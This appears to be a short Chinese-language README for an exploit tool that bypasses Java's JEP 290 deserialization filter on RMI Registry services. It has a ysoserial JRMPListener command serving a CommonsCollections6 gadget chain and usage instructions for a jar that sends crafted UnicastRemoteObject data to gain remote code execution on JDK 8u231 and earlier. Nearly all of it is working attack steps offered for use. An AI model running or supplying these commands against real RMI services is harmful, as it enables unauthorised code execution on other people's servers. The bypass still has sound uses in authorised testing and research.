# rmi_bypass_jep290
### 利用 UnicastRemoteObject + JRMPListener Bypass jep290

首先利用 ysoserial 开启 JRMPListener 服务监听

```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "touch /tmp/test.txt"
```

然后在利用特殊的 lookup 方法将特殊构造的 UnicastRemoteObject 序列化数据发送到 RMI Registry 服务，在其反序列化的时候会创建JRMP连接，从而形成任意代码执行。

```
Usage: java -jar rmi_bypass_jep290.jar rmi_server_ip rmi_server_port jrmp_listener_ip jrmp_listener_port
```

**适用的JDK版本：JDK <= 8u231**


参考链接：https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/
